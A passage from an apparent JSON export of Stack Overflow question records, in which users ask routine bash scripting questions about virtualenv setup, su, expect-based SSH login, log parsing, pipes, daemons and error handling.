href=\"http://www.macports.org/ports.php?by=name&amp;substr=virtualenvwrapper\" rel=\"nofollow\">macports</a>: <code>/opt/local/bin/virtualenv-2.7</code>), I tried using it directly instead:</p>\n\n<pre><code>#!/usr/bin/env bash\n\n# Name your first \"bootstrap\" environment:\nENV_NAME=NotOrion\n# Options for your first environment:\nENV_OPTS='--no-site-packages --distribute'\n\nunset PYTHONDONTWRITEBYTECODE\n\nfunction create_virtualenvwrapper_venv {\n  echo \"installing into virtualenvwrapper directory\"\n  cd $WORKON_HOME\n  $VIRTUALENVWRAPPER_VIRTUALENV $ENV_OPTS $ENV_NAME\n  cd -\n  #mkvirtualenv $ENV_NAME\n  #workon $ENV_NAME\n}\n\nfunction create_standalone_venv {\n  # not run/snipped\n}\n\nif [ -z \"$VIRTUALENVWRAPPER_VIRTUALENV\" ]; then\n  create_standalone_venv\nelse\n  create_virtualenvwrapper_venv\nfi\n\npip install shovel\nshovel help\n</code></pre>\n\n<p>My bootstrap script finishes installing shovel. However running shovel (eg the last line) produces warnings:</p>\n\n<pre><code>/Users/me/.virtualenvs/NotOrion/bin/shovel:25: UserWarning: Module argparse was already imported from /opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/argparse.pyc, but /Users/me/.virtualenvs/NotOrion/lib/python2.7/site-packages is being added to sys.path\nimport pkg_resources\n# normal shovel output snipped\n</code></pre>\n\n<p>So is it possible to somehow invoke \"mkvirtualenv\" from a script? If not, can I run something else from my script that has the same effect but <strong>doesn't</strong> produce warnings?</p>\n"},{"tags":["ruby","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":68,"score":3,"question_id":13111201,"title":"` (backtick) is unexpected token","body":"<p>I'm doing some command line executions I learned in <a href=\"http://mentalized.net/journal/2010/03/08/5_ways_to_run_commands_from_ruby/\" rel=\"nofollow\">this blog post</a> such as <code>system</code> or <code>IO.popen</code> on the file, and am getting errors.</p>\n\n<p>Why is the backtick appearing, what does it mean, and how do I continue? Please explain.</p>\n\n<pre><code> system('./err.rb')\n-bash: syntax error near unexpected token `'./err.rb''\n</code></pre>\n\n<p>Similarily, when I run <code>IO.popen</code>:</p>\n\n<pre><code>output = IO.popen('./err.rb')\n-bash: syntax error near unexpected token `('\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13111474,"title":"How to retrieve lib directory?","body":"<p>How can I use bash to retrieve lib directory? For example: <code>/usr/lib</code> or <code>/usr/lib64</code>?</p>\n\n<p><em>Edit</em></p>\n\n<p>I'm packaging an RPM which copies some files to <code>%{_libdir}</code>. So I'd like to know the path to lib directory… I can use <code>if [ -f \"path-to-my-file\" ]; then ...</code> but I wonder if there is a command line?</p>\n"},{"tags":["bash","shell","applescript"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":13090235,"title":"applescript and terminal ( run several do shell script in one terminal window )","body":"<p>I do have several shell scripts whom are get activate not really behind each other.</p>\n\n<p>But I want to stay in the same terminal window.</p>\n\n<p>To simplify the problem, lets say that as example</p>\n\n<p>first script. - cd to the working directory\nsecond.       - do some things and get files from that directory\nthird.        - dome more thing on the newly files/folders in that directory.\nfourth.       - ....</p>\n\n<p>How can I let script 2 and 3 ( all the script thus ) run in that very same directory and window that is opened during script 1?</p>\n\n<p>F.e how can I avoid using the full path to that folder for every file.</p>\n\n<p>EDIT: After adayzdone's answer I realize that I forgot to mention that I need also administrator privileges for one of the scripts</p>\n\n<p>EDIT2: For now I use this</p>\n\n<pre><code>tell application \"Terminal\"\n    set newTab to do script\n    set current settings of newTab to settings set \"Grass\"\n    do script \"bin/sh/ echo 'xx' | su;\" in newTab\n    do script \"cd \" &amp; quoted form of realParentPath in newTab\n    do script shellscript1 in newTab\n    do script shellscript..n in newTab\n    activate\nend tell\n</code></pre>\n\n<p>but still no dice with the privileges.</p>\n"},{"tags":["osx","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":36,"score":2,"question_id":13109993,"title":"How to use wildcard with files which names start with '-'?","body":"<p>There are some files which names start with '-', such as '-1.png', '-2.png'. I can't operate them with wildcard, because those names are regarded as options:</p>\n\n<pre><code>bash-3.2$ ls *.png\nls: illegal option -- .\nusage: ls [-ABCFGHLOPRSTUWabcdefghiklmnopqrstuwx1] [file ...]\nbash-3.2$ rm *.png\nrm: illegal option -- 1\nusage: rm [-f | -i] [-dPRrvW] file ...\n       unlink file\n</code></pre>\n\n<p>How to solve this problem?</p>\n"},{"tags":["osx","bash","fortran","sh","gfortran"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13102926,"title":"Multiple modules gfortran compiling","body":"<p>sas the title said i have a folder with 354 .f90 modules (and the main file). In the readme this is suggested:</p>\n\n<pre><code>The best approach is to unzip the archive source.zip\nextracting all 354 program files into a directory of your choice. \nThen you can compile with the command\ngfortran *.f90 -o app.exe\n</code></pre>\n\n<p>I'm on Mac so i installed gfortran but doing the command written above doesn't work:</p>\n\n<pre><code>gfortran: *.f90: No such file or directory\n</code></pre>\n\n<p>so i suppose that a bash script is needed (or at least a makefile).\nI'm not used in doing this so what should i do? Do exist some makefile automatic generator?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["regex","bash","if-statement","tcsh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13103048,"title":"Translation bash to tcsh, if with pattern","body":"<p>I hava following code in bash:</p>\n\n<pre><code>if  [[ $a =~ ^[+-]?([0-9]+\\.?[0-9]*|[0-9]*\\.?[0-9]+)([DdEeQ][+-]?[0-9]+)?$ ]]; then\n</code></pre>\n\n<p>How can I do this in tcsh? I tried: </p>\n\n<pre><code>if  ( $a =~ {^[+-]?{[0-9]+\\.?[0-9]*\\|[0-9]*\\.?[0-9]+}{[DdEeQ][+-]?[0-9]+}?\\$} ) then\n</code></pre>\n\n<p>It doesn't work.</p>\n"},{"tags":["bash","scripting"],"answer_count":7,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":120,"score":4,"question_id":9157934,"title":"$* in bash scripting","body":"<p>Can anybody tell me what does <code>$*</code> mean in bash scripting? </p>\n\n<p>I tried to search on google for it, but I found only about <code>$0</code>, <code>$1</code> and so on.</p>\n\n<p>So, if have a link for this, is welcome.</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","pipes","tee"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13107783,"title":"Pipe output to two different commands","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10218103/osx-linux-pipes-into-two-processes\">osx/linux: pipes into two processes?</a>  </p>\n</blockquote>\n\n\n\n<p>Is there a way to pipe the output from one command into the input of two other commands, running them simultaneously?</p>\n\n<p>Something like this:</p>\n\n<pre><code>$ echo 'test' |(cat) |(cat)\ntest\ntest\n</code></pre>\n\n<p>The reason I want to do this is that I have a program which receives an FM radio signal from a USB SDR device, and outputs the audio as raw PCM data (like a .wav file but with no header.)  Since the signal is not music but POCSAG pager data, I need to pipe it to a decoder program to recover the pager text.  However I also want to listen to the signal so I know whether any data is coming in or not.  (Otherwise I can't tell if the decoder is broken or there's just no data being broadcast.)  So as well as piping the data to the pager decoder, I also need to pipe the same data to the <code>play</code> command.</p>\n\n<p>Currently I only know how to do one - either pipe it to the decoder and read the data in silence, or pipe it to <code>play</code> and hear it without seeing any decoded text.</p>\n\n<p>How can I pipe the same data to both commands, so I can read the text and hear the audio?</p>\n\n<p>I can't use <code>tee</code> as it only writes the duplicated data to a file, but I need to process the data in real-time.</p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3730,"score":4,"question_id":1988249,"title":"How do I use su to execute the rest of the bash script as that user?","body":"<p>I've written a script that takes, as an argument, a string that is a concatenation of a username and a project. The script is supposed to switch (su) to the username, cd to a specific directory based upon the project string.</p>\n\n<p>I basically want to do:</p>\n\n<pre><code>su $USERNAME;  \ncd /home/$USERNAME/$PROJECT;  \nsvn update;  \n</code></pre>\n\n<p>The problem is that once I do an su... it just waits there. Which makes sense since the flow of execution has passed to switching to the user. Once I exit, then the rest of the things execute but it doesn't work as desired.</p>\n\n<p>I prepended su to the svn command but the command failed (i.e. it didn't update svn in the directory desired).</p>\n\n<p>How do I write a script that allows the user to switch user and invoke svn (among other things)?</p>\n"},{"tags":["bash","tcsh"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":289,"score":1,"question_id":10317384,"title":"Remove one directory component from path (string manipulation)","body":"<p>I'm looking for the easiest and most readable way to remove a field from a path. So for example, I have /this/is/my/complicated/path/here, and I would like to remove the 5th field (\"/complicated\") from the string, using bash commands, so that it becomes /this/is/my/path.\nI could do this with</p>\n\n<pre><code>echo \"/this/is/my/complicated/path/here\" | cut -d/ -f-4\necho \"/\"\necho \"/this/is/my/complicated/path/here\" | cut -d/ -f6-\n</code></pre>\n\n<p>but I would like this done in just one easy command, something that would like</p>\n\n<pre><code>echo \"/this/is/my/complicated/path\" | tee &gt;(cut -d/ -f-4) &gt;(cut -d/ -f6-)\n</code></pre>\n\n<p>except that this doesn't work.</p>\n"},{"tags":["bash","ubuntu","format","fortune"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13107619,"title":"How to format cowsay output from a bash script","body":"<p>I have a custom motd within a bash script that prints cowsay through this command,</p>\n\n<pre><code>/usr/games/fortune | cowsay -f www \n</code></pre>\n\n<p>I want to find out if there is a way of formatting this output such as shifting the output by a tab or a space ? Do I have to loop through the text manually formatting each line or is there a shorter/better way ?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","debugging","vim","script"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":48,"score":-2,"question_id":13103465,"title":"Bash script debugging with gvim/Pyclewn","body":"<p>Do you know how to use Pyclewn (graphical debugger frontend within gvim) with bashdb (bash debugger) with the clewn/debugger.py file? (see the section number 10 of the <a href=\"http://pyclewn.sourceforge.net/_static/pyclewn.html\" rel=\"nofollow\">man pages of pyclewn</a>). I already use Pyclewn for gdb (programming in C) and pdb (programming in Python). </p>\n\n<p>For bash programming, I tried ddd.3.3.9 (old version of gnu data display debugger because there are some problems with ddd.3.3.12 and bashdb) but this is ugly and there is no color syntax highlighting. I also tried emacs + <a href=\"https://github.com/rocky/emacs-dbgr/wiki\" rel=\"nofollow\">the rocky/dbgr rewrite of GUD</a> (emacs grand unified debugger) but I prefer gvim/Pyclewn. The bash-support.vim plugin is just launching xterm with bashdb so it's not a solution.</p>\n"},{"tags":["bash","alias"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13107092,"title":"why is \"noclobber\" appearing in bash command arguments","body":"<p>There are a bunch of folders in ~/path/ with names that begin with prefix, and I need to access them very frequently. I'm trying to create a shortcut in .bashrc that will make \"prefix example\" run the command \"cd ~/path/prefixexample\".</p>\n\n<p>I encountered the same issue with both functions and aliases:</p>\n\n<pre><code>function prefix(){ \"cd ~/path/prefix$1\"; }\n\nalias prefix=\"cd ~/path/prefix$1\"\n</code></pre>\n\n<p>When I type \"prefix 4\" (the folder path/prefix4 does exist), I get:</p>\n\n<pre><code>bash: cd: path/prefixnoclobber: No such file or directory\n</code></pre>\n\n<p>I don't have admin privileges on this machine, so I can't change some things.</p>\n\n<p>.bashrc already contains a bunch of stuff, but the only relevant thing seems to be \"set noclobber\". I'm pretty sure replacing arguments with the string \"noclobber\" is not part of the functionality of the noclobber switch, and commenting this switch out had no effect.</p>\n"},{"tags":["bash","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":13106607,"title":"SSH login with bash and expect","body":"<p>I have to ssh into numerous devices daily, over and over...\nI can automate it with bash &amp; expect with this script:</p>\n\n<pre><code>#!/usr/bin/expect\nspawn  ssh hostname -l username\nexpect \"password:\"\nsend \"secret\\n\"\ninteract\n</code></pre>\n\n<p>The majority of the devices require 'root' as the login, so the above script works well for that. I'd like to modify the above script to attempt to login once, and if it fails, to switch to another username and prompt me for the password. Is that possible?</p>\n\n<p>I know about keys, and the bad practice of passwords in scripts, it isn't important in my case.</p>\n"},{"tags":["bash","awk","gnu","cut"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":132,"score":2,"question_id":12343156,"title":"how can I split up this string","body":"<p>I am currently trying to sanitize some log files so they are in an easier format to read, and have been trying to use the gnu cut command, which works fairly well, although I cannot really think of a good way to remove the [INFO] part of the string</p>\n\n\n\n<pre class=\"lang-none prettyprint-override\"><code>logs/logs/server_1283258036.log:2010-08-31 23:06:51 [INFO] &lt;NateMar&gt; where?!\nlogs/logs/server_1281904775.log:2010-08-15 22:59:53 [INFO] &lt;BoonTheMoon&gt; Â§b&lt;BoonTheMoon&gt;Â§ohhhhhh\nlogs/logs/server_1282136782.log:2010-08-18 16:27:32 [INFO] &lt;pinguin&gt; &lt;pinguin&gt;Â§F :/\nlogs/logs/server_1282136782.log:2010-08-18 16:27:37 [INFO] &lt;TotempaaltJ&gt; &lt;TotempaaltJ&gt;Â§F That helped A LOT\nlogs/logs/server_1282136782.log:2010-08-18 16:27:37 [INFO] &lt;Rizual&gt; Â§b&lt;Rizual&gt;Â§F hm?\nlogs/logs/server_1282136782.log:2010-08-18 16:29:10 [INFO] &lt;pinguin&gt; &lt;pinguin&gt;Â§F bah\nlogs/logs/server_1282136782.log:2010-08-18 16:29:35 [INFO] &lt;TotempaaltJ&gt; &lt;TotempaaltJ&gt;Â§F Finished my houses \nlogs/logs/server_1282136782.log:2010-08-18 16:29:40 [INFO] &lt;TotempaaltJ&gt; &lt;TotempaaltJ&gt;Â§F or whatever\nlogs/logs/server_1282136782.log:2010-08-18 16:30:47 [INFO] &lt;Rizual&gt; Â§b&lt;Rizual&gt;Â§So much iron\nlogs/logs/server_1282136782.log:2010-08-18 16:30:58 [INFO] &lt;TotempaaltJ&gt; &lt;TotempaaltJ&gt;Â§F Ah yes, furnaces don't work.o\nlogs/logs/server_1282136782.log:2010-08-18 16:31:01 [INFO] &lt;Rizual&gt; Â§b&lt;Rizual&gt;Â§F They do\nlogs/logs/server_1282136782.log:2010-08-18 16:31:06 [INFO] &lt;TotempaaltJ&gt; &lt;TotempaaltJ&gt;Â§F Hm\nlogs/logs/server_1282136782.log:2010-08-18 16:31:08 [INFO] &lt;Rizual&gt; Â§b&lt;Rizual&gt;Â§F just need to use /lighter\nlogs/logs/server_1282136782.log:2010-08-18 16:31:12 [INFO] &lt;Valrix&gt; &lt;Valrix&gt;Â§FNotch fixed them?\n</code></pre>\n\n<p>I would ultimately want to get the strings down to something that resembles the following (keep in mind that the logs are in two formats, the older format which has 2 copies of the names, as can be seen in the bulk of the logs above, and also the newer format, which only has the name in there once (can be seen in the first log line, the <code>&lt;natemar&gt;</code> one))</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>2010-08-31 23:06:51 &lt;NateMar&gt; where?!    \n2010-08-15 22:59:53 &lt;BoonTheMoon&gt; ohhhhhh (this one would require both the same editing as above, plus removal of the \"extra\" name Â§b&lt;BoonTheMoon&gt;Â§)    \n</code></pre>\n\n<p>How should I go about doing this? Have thought about using awk, although I'm having a difficult time getting a grip on how that would work, so not sure how to set up something to do that. Any help would be greatly appreciated, thanks! </p>\n"},{"tags":["bash","loops","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13093840,"title":"repetitive instructions bash script","body":"<p>This could easily be any lang...but I'm using bash for now. I'm looking for the understanding behind this that can be replicated across langs.</p>\n\n<p>so...</p>\n\n<p>I'm copying a file up the directory tree and than replacing that file with another.</p>\n\n<pre><code>     cp \"$DIR\"/folder2/file2 \"$DIR\";\n     mv \"$DIR\"/folder1/file1 \"$DIR\"/folder2/file2;\n</code></pre>\n\n<p>Then I take the copied file and move it into another folder..starting the same dance.</p>\n\n<pre><code>     cp \"$DIR\"/folder3/file3 \"$DIR\";\n     mv \"$DIR\"/file2 \"$DIR\"/folder3/file3\n</code></pre>\n\n<p>I want to do this like 100 times+.</p>\n\n<p>what's the most elegant way?</p>\n\n<p>Elegant, in the sense of brief and understandable by someone else.</p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13104259,"title":"Extract unique lines from a file in order of their first occurence in bash","body":"<p>I have a file with a list of strings.  I'd like to extract out the unique strings, in the order that they first appear in the file.</p>\n\n<p>So, for instance, if my file contains:</p>\n\n<pre><code>foo\nbar\nfoo\nbar\nbaz\nbar\nfoo\n</code></pre>\n\n<p>I'd like to output:</p>\n\n<pre><code>foo\nbar\nbaz\n</code></pre>\n\n<p>If I just wanted the unique values, I could use <code>sort input|uniq</code>, but this sorts my result alphabetically.</p>\n"},{"tags":["bash","script","github"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13106269,"title":"How can I download the most recent version of a GitHub project to use in a bash script?","body":"<p>I'm working on a script that sets up a CMS (<a href=\"http://statamic.com\" rel=\"nofollow\">Statamic</a>) so that devs can jump write into writing code and not have to manually move stuff around, gather commonly used code from GitHub, and so on.</p>\n\n<p>I need a way to grab the most recent version of a project from GitHub, unzip it, and be able to move stuff around without knowing the lastest sha.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":903,"score":3,"question_id":4650208,"title":"Shell Script- each unique user","body":"<p>I have a homework assignment: \"for each unique user, report which group they are a member of and when they last logged in\"</p>\n\n<p>So far I have:</p>\n\n<pre><code>#!/bin/sh\n\necho \"Your initial login:\"\nwho | cut -d' ' -f1 | sort | uniq\n\necho \"Now is logged:\"\nwhoami\n\necho \"Group ID:\"\nid -G $whoami\n\ncase $1 in\n   \"-l\") last -Fn 10 | tr -s \" \" ;;\n   *)    last -Fn 10 | tr -s \" \" | egrep -v '(^reboot)|(^$)|(^wtmp a)|(^ftp)' | cut -d\" \" -f1,5,7 | sort -uM | uniq -c\nesac\n</code></pre>\n\n<p>My question is: how I can show the each unique user? The script above only show the more recent user logged in the system, but I need all unique users.</p>\n\n<p>Can anyone help?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":350,"score":4,"question_id":4650906,"title":"How can I shift digits in bash?","body":"<p>I have a homework assignment that is asking to shift a decimal number by a specified amount of digits. More clearly this bash script will take two input arguments, the first is the number(maximum 9 digits) that the shift will be performed on and the second is the number(-9 to 9) of digits to shift. Another requirement is that when a digit is shifted off the end, it should be attached to the other end of the number. One headache of a requirement is that we cannot use control statements of any kind: no loops, no if, and switch cases. </p>\n\n<p>Example: 12345 3 should come out to 345000012 and 12345 -3 should be 12345000</p>\n\n<p>I know that if I mod 12345 by 10^3 I get 345 and then if I divide 12345 by 10^3 I get 12 and then I can just concatenate those two variables together to get 34512. I am not quite sure if that is exactly correct but that is the closest I can get as of now. As far as the -3 shift, I know that 10^-3 is .001 and would work however when I try using 10^-3 in bash I get an error. </p>\n\n<p>I am just lost at this point, any tips would be greatly appreciated.</p>\n\n<p>EDIT: After several hours of bashing (pun intended) my head against this problem, I finally came up with a script that for the most part works. I would post the code right now but I fear another student hopelessly lost might stumble upon it. I will check back and post what I came up with in a week or two. I was able to do it with mods and division. Thank you all for the responses, it really helped me to open up and think about the problem from different angles. </p>\n"},{"tags":["bash","compression"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":22,"score":-1,"question_id":13104834,"title":"Changing compression in memory","body":"<p>I have some large files that I need to change the compression type of for input to a program--I need to unrar them and then gzip (or bzip2) them.  However, they're highly compressed files and I don't have the disk space to unrar them fully then gzip them.  Is there any way to pipe the output of decompression via unrar to gzip or some other compression without saving the entire intermediate result to disk?</p>\n"},{"tags":["bash","csv","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":12814512,"title":"Grep -f and only return the first match","body":"<p>I'm working with a large CSV that follows a basic process.</p>\n\n<ol>\n<li>Backup the working original</li>\n<li>Generate a skeleton CSV</li>\n<li>Read from another CSV, format the contents, and then append it to the skeleton</li>\n<li>Append the data from the backup to the new one.</li>\n</ol>\n\n<p>The issue I'm running into is that when I read in the contents from the backup, I'm using <code>grep -Ev -f</code> with a file containing regexes to exclude undesired data from the backup to be included in the next revision. This currently presents a problem because grep appears to evaluate each regex in the file against every line from STDIN which will cause duplicates. The simple solution would be to simply pipe it through <code>sort | uniq</code> and call it a day but that will screw with the formatting of the csv currently in use. I can elaborate if needed but the short of it is I run a script to bulk process IP addresses but there is also manual editing of the file by other people and with the current form of the script the final output will be all of the automated content with manual entries being at the bottom of the file. </p>\n\n<p>So, is there anyway without some ugly looping of grep to tell it to stop evaluating a line after a pattern is matched? Using <code>-m 1</code> will stop grep after the first match in the whole stream where I need it stop after each new line.</p>\n"},{"tags":["string","bash","parameters","space"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":25,"score":-1,"question_id":13104616,"title":"bash reading string with spaces as parameter","body":"<p>I found on phorum how to solve when a funciton is called with more parameters and each as string with spaces, but how to read string with spaces from input, I mean when somebody call my script. </p>\n\n<p>In this case, user should send two txt files asdresses. So, I know the suffix, but he could also send files that haven't got that suffix. So, is there any way how to read the two file adresses? </p>\n\n<p>I think that this is a basic question (how to read parameters) but I've been unable to solve, 'cause haven't found anything on google and been very big begginer to bash.</p>\n\n<p>thx in advance</p>\n"},{"tags":["bash","smtp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13098268,"title":"smtp header / body seperator","body":"<p>I need to seperate the header and body of a smtp message in bash. I know that a newline is used to indicate the end of the header, but is it always <code>\\n</code>, <code>\\r</code> or  <code>\\r\\n</code>, or do different operating systems use different ones?</p>\n\n<p>How can I do this?</p>\n"},{"tags":["bash","signals","daemon"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13100128,"title":"How to make daemon --stop blocking until underlying process will die?","body":"<p>I have a java process daemonized using <code>daemon</code> command (RHEL 6.2). I'm using following line to start the process and the line below to stop it:</p>\n\n<pre><code>daemon --command \"/opt/my-service\" --respawn --name=my-service --verbose\ndaemon --stop --name=my-service --verbose  \n</code></pre>\n\n<p>Things work until I'll try to restart my process using stop/start approach:</p>\n\n<pre><code>daemon --stop --name=my-service --verbose\ndaemon --command \"/opt/my-service\" --respawn --name=my-service --verbose\n</code></pre>\n\n<p>It the process is running before the above command is executed, then existing process will be stopped but then new one will not be created. Instead, following line will be logged to the <code>/var/log/messages</code>:</p>\n\n<blockquote>\n  <p><code>Oct 27 07:59:46 myhostname my-service: my-service: fatal: failed to become a daemon: Resource temporarily unavailable</code></p>\n</blockquote>\n\n<p>which as far as I understand means that we tried to acquire lock on the pid file but another process was holding the lock on it. Or in the other words: the original process was still running.</p>\n\n<p>What is interesting it can not be reproduced by i.e. following command:</p>\n\n<pre><code>daemon --command \"sleep 30s\" --respawn --name=sleeper --verbose\ndaemon --stop --name=sleeper --verbose\ndaemon --command \"sleep 30s\" --respawn --name=sleeper --verbose\n</code></pre>\n\n<p>then there must be something in my process which causes/exploits asynchronous nature of <code>--stop</code>.</p>\n\n<p>How can I make <code>--stop</code> blocking?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13101621,"title":"Checking if length of array is equal to a variable in bash","body":"<p>I want to check if the length of a bash array is equal to a bash variable (int) or not. My current code looks like this:</p>\n\n<pre><code>if [ \"${#selected_columns}\" -eq \"${number_of_columns}\" ]; then\n    echo \"They are equal!\"\nfi\n</code></pre>\n\n<p>This returns false since the echo statement is never run. However, doing this produces 4 for both of them:</p>\n\n<pre><code>echo \"${#selected_columns[@]}\"\necho \"${number_of_columns}\"\n</code></pre>\n\n<p>What's wrong here? Has it something to do with string versus int?</p>\n"},{"tags":["bash","error-handling","error-logging"],"answer_count":11,"favorite_count":29,"up_vote_count":49,"down_vote_count":0,"view_count":34831,"score":49,"question_id":64786,"title":"Error handling in BASH","body":"<p>What is your favorite method to handle errors in BASH? \nThe best example of handling errors in BASH I have found on the web was written by William Shotts, Jr at <a href=\"http://www.linuxcommand.org\" rel=\"nofollow\">http://www.linuxcommand.org</a>. </p>\n\n<p>William Shotts, Jr suggests using the following function for error handling in BASH:</p>\n\n<pre><code>#!/bin/bash\n\n# A slicker error handling routine\n\n# I put a variable in my scripts named PROGNAME which\n# holds the name of the program being run.  You can get this\n# value from the first item on the command line ($0).\n\n# Reference: This was copied from &lt;http://www.linuxcommand.org/wss0150.php&gt;\n\nPROGNAME=$(basename $0)\n\nfunction error_exit\n{\n\n#   ----------------------------------------------------------------\n#   Function for exit due to fatal program error\n#   \tAccepts 1 argument:\n#   \t\tstring containing descriptive error message\n#   ----------------------------------------------------------------\n\n\n    echo \"${PROGNAME}: ${1:-\"Unknown Error\"}\" 1&gt;&amp;2\n    exit 1\n}\n\n# Example call of the error_exit function.  Note the inclusion\n# of the LINENO environment variable.  It contains the current\n# line number.\n\necho \"Example of error with line number and message\"\nerror_exit \"$LINENO: An error has occurred.\"\n</code></pre>\n\n<p>Do you have a better error handling routine that you use in BASH scripts?</p>\n"},{"tags":["bash","diskusage"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13101643,"title":"Escaping singlequote in random filenames","body":"<p>I have a simple bash script which outputs the total file size using 'du'\nHowever every time I pass a file that contains an apostrophe it presents me with a syntax error.\nSo I'd like to know if there was a way to escape singlequotes without modifying the filenames. Preferably before diskusage processes them.</p>\n\n<p>The code is:</p>\n\n<pre><code>du -chs {query}\n</code></pre>\n\n<p>I use Alfred to pass the files into the script. The application allows the user to escape a few characters but the single quote is not one of them.</p>\n"},{"tags":["c","linux","bash","application","script"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":13081106,"title":"Programming simple GUI applications? A couple considerations","body":"<p>I am wanting to start programming some simple applications that I can use as tools and such. I am hoping these applications will allow me to simplify certain terminal processes I use often. They interact with my local files lots as well as other applications (db2 for example). I have started learning C a little bit for this.</p>\n\n<p>I thought I would use C with embedded bash commands. I was wondering if that was the best/most common method of programming these applications? Is there a better way of doing this? Also, I will need to be able to display the terminal output. Will this be possible? My only issue with this method is that it is not very transferable to non Linux operation system.</p>\n\n<p>Any insight or a push in the general direction would be greatly appreciated.</p>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":13087868,"title":"Printing column from a string in bash","body":"<p><strong>UPDATED QUESTION</strong>\nOk, so I have a file with lines like this:</p>\n\n<pre><code>44:)   2.884E-02  0.000E+00  0.000E+00  2.780E+02  0.000E+00  0.000E+00  9.990E+02\n45:)   2.884E-02  0.000E+00  0.000E+00  2.780E+02  0.000E+00  0.000E+00  9.990E+02\n1:)   3.593E-02  0.000E+00  0.000E+00  2.780E+02  0.000E+00  0.000E+00  1.000E+05\n2:)   3.593E-02  0.000E+00  0.000E+00  2.780E+02  0.000E+00  0.000E+00  1.000E+05\n</code></pre>\n\n<p>The numbers in the first column run from 1 to x (in this case 45) and then starts over at 1 lots of times. I want to move some of the columns to a separate file. The indexes of the columns I want to move is stored in the variable/array <code>$selected_columns</code> (in this case 2, 5 and 8) and the number of columns I want to move is stored in <code>$number_of_columns</code> (in this case 3).</p>\n\n<p>I then want to create 45 files, one for the selected columns for all <code>1:)</code>, one for the selected columns for all <code>2:)</code> and so forth. I want to make this as general as possible since both the number of columns and the number running from 1 to x will change. The number x is always known and the columns to extract are chosen by the user.</p>\n\n<p><strong>ORIGINAL QUESTION:</strong></p>\n\n<p>I have a string fetched by egrep. Then I want to print some of the columns (words) in that string. The position (column index) is known in a list in my bash script. Currently it looks like this:</p>\n\n<pre><code>line=$(egrep \" ${i}:\\)\" $1)\n\nfor ((j=1; j&lt;=$number_of_columns; j++))\ndo\n    awk $line -v current_column=${selected_columns[$j]} '{printf $(current_column)}' &gt; \"history_files/history${i}\"\ndone\n</code></pre>\n\n<p>where <code>number_of_columns</code> is the number of columns that are to be printed and <code>selected_columns</code> contain the corresponding indexes of those columns. As an example <code>number_of_columns = 3</code> and <code>selected_columns = [2 5 8]</code>, so I want to print word number 2, 5 and 8 from the string <code>line</code> to the file <code>history${i}</code>.</p>\n\n<p>I am not sure what is wrong, but this has been done with some trial and error. The current error is <code>awk: cannot open 0.000E+00 (No such file or directory)</code>.</p>\n\n<p>Any help is appreciated!</p>\n"},{"tags":["linux","bash","find"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13100991,"title":"linux find command unnecessary data","body":"<p>I'm trying to write simple bash script and I'm stuck with <code>find</code> command.</p>\n\n<p>When I type <code>find . zad*</code>, I get output 